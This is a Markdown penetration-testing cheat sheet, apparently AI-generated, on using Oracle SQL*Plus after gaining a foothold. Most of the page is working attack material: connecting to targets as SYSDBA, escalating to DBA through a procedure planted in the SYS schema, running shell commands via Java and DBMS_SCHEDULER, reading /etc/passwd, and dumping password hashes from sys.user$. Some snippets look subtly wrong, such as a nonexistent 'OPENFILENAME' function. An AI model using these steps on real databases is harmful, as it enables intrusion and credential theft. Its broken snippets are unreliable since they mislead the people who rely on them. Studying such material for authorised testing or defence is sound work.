# SQL*Plus

**Tags:** `#sqlplus` `#oracle` `#database` `#postexploitation` `#enumeration`

Oracle's native command-line client — connects to Oracle Database instances for interactive SQL sessions. Used post-foothold when valid Oracle credentials are found, or after ODAT establishes access. Required for manual Oracle DB exploitation, privilege escalation, and data extraction when more automated tools aren't available.

**Source:** Oracle Instant Client — https://www.oracle.com/database/technologies/instant-client/downloads.html
**Install:**
```bash
# Download Instant Client + SQL*Plus packages from Oracle
# Kali — install both basic and sqlplus packages
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip -d /opt/oracle
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip -d /opt/oracle
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_12
export PATH=$PATH:/opt/oracle/instantclient_21_12
```

```bash
# Connect
sqlplus user/password@<target-ip>:1521/SID
```

> [!note] **SQL*Plus vs ODAT** — ODAT automates Oracle exploitation (brute force, privesc, file read/write, OS commands). SQL*Plus is for manual interaction once you have credentials. Use ODAT to gain access, SQL*Plus for deeper manual exploitation.

---

## Connecting

```bash
# Standard connection — user/pass@host:port/SID
sqlplus scott/tiger@192.168.1.10:1521/XE

# SYS as SYSDBA (highest privilege)
sqlplus sys/password@192.168.1.10:1521/ORCL as sysdba

# SYSOPER role
sqlplus sys/password@192.168.1.10:1521/ORCL as sysoper

# Connection string format
sqlplus 'user/password@//192.168.1.10:1521/ORCL'

# Prompt for password (avoid password in shell history)
sqlplus user@192.168.1.10:1521/ORCL
```

**Common SIDs to try:** `ORCL`, `XE`, `DB`, `PROD`, `TEST`, `DBMS`, `HRDB`

---

## Common SQL*Plus Commands

```sql
-- Current user
SELECT USER FROM DUAL;

-- Oracle version
SELECT * FROM v$version;

-- List all databases/SIDs
SELECT name FROM v$database;

-- List tablespaces
SELECT tablespace_name FROM dba_tablespaces;

-- List all users
SELECT username, account_status FROM dba_users;

-- List tables in current schema
SELECT table_name FROM user_tables;

-- List all tables (requires DBA or SELECT ANY TABLE)
SELECT owner, table_name FROM all_tables ORDER BY owner;

-- List tables in specific schema
SELECT table_name FROM all_tables WHERE owner = 'SCOTT';

-- Current privileges
SELECT * FROM session_privs;

-- Check if current user is DBA
SELECT * FROM dba_role_privs WHERE grantee = USER;

-- Switch schema
ALTER SESSION SET CURRENT_SCHEMA = SCOTT;
```

---

## Privilege Escalation

```sql
-- List users with DBA role
SELECT grantee FROM dba_role_privs WHERE granted_role = 'DBA';

-- Check for dangerous privileges
SELECT * FROM dba_sys_privs WHERE privilege IN (
  'CREATE ANY PROCEDURE','EXECUTE ANY PROCEDURE',
  'CREATE ANY TRIGGER','ALTER ANY TRIGGER',
  'CREATE LIBRARY','EXECUTE ANY LIBRARY',
  'BECOME USER','ALTER USER'
);

-- Escalate via CREATE ANY PROCEDURE (if granted)
-- Create procedure in SYS schema that grants DBA to current user
CREATE OR REPLACE PROCEDURE sys.escalate AS
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO ' || USER;
END;
/
EXEC sys.escalate;

-- Check after escalation
SELECT * FROM session_privs WHERE privilege = 'SELECT ANY TABLE';
```

---

## OS Command Execution

Oracle 11g+ — `UTL_FILE`, `DBMS_SCHEDULER`, or `JAVA_EXEC` depending on privileges.

```sql
-- Check if Java is enabled
SELECT value FROM v$option WHERE parameter = 'Java';

-- OS command via Java (requires JAVA privilege — often granted in older DBs)
SELECT dbms_java.runjava('oracle/aurora/util/Wrapper /bin/bash -c "id > /tmp/out.txt"') FROM DUAL;

-- OS command via DBMS_SCHEDULER (Oracle 10g+)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'SHELL_JOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('SHELL_JOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('SHELL_JOB', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('SHELL_JOB');
END;
/

-- Read output file
CREATE DIRECTORY tmp_dir AS '/tmp';
SELECT * FROM OPENFILENAME(BFILENAME('TMP_DIR','out.txt'), 1, 200);
```

---

## File Read / Write

```sql
-- Read file via UTL_FILE (requires CREATE DIRECTORY or DBA)
CREATE OR REPLACE DIRECTORY read_dir AS '/etc';

DECLARE
  f UTL_FILE.FILE_TYPE;
  buf VARCHAR2(4000);
BEGIN
  f := UTL_FILE.FOPEN('READ_DIR', 'passwd', 'R');
  LOOP
    UTL_FILE.GET_LINE(f, buf);
    DBMS_OUTPUT.PUT_LINE(buf);
  END LOOP;
  EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(f);
END;
/

-- Enable DBMS_OUTPUT first
SET SERVEROUTPUT ON;
```

---

## Data Extraction

```sql
-- Dump a table
SELECT * FROM schema.tablename;

-- Find password-related columns
SELECT owner, table_name, column_name FROM all_columns
  WHERE column_name LIKE '%PASS%' OR column_name LIKE '%PWD%' OR column_name LIKE '%CRED%';

-- Hash dump from user$ (requires DBA)
SELECT name, password, spare4 FROM sys.user$;
-- spare4 = SHA-1 or SHA-512 hash depending on version
-- password = older DES-based hash (ORA-)
```

---

## SQL*Plus Shell Shortcuts

```
exit / quit          # disconnect
SET PAGESIZE 200     # more rows before header repeat
SET LINESIZE 300     # wider output
SET SERVEROUTPUT ON  # enable DBMS_OUTPUT
SPOOL /tmp/out.txt   # write output to file
SPOOL OFF
DESC tablename       # describe table structure
/                    # re-run last statement
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
